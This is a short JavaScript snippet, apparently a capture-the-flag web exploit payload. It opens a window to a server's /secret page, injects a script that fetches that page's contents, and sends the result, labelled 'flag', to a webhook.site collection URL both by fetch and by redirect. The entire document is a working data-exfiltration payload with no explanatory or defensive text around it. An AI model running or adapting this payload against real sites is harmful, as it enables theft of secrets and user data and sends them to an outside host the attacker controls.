

let value = window.open('http://20.235.243.131:8443/secret');
value.window.onload=()=>{
    value.document.write('<script>fetch("/secret").then(data => data.text()).then(flag => {fetch("https://webhook.site/d5e20e1a-b2bf-451e-9297-1305787aad9b?flag="+flag);window.location = "https://webhook.site/d5e20e1a-b2bf-451e-9297-1305787aad9b/?flag="+flag;})</script>');
}


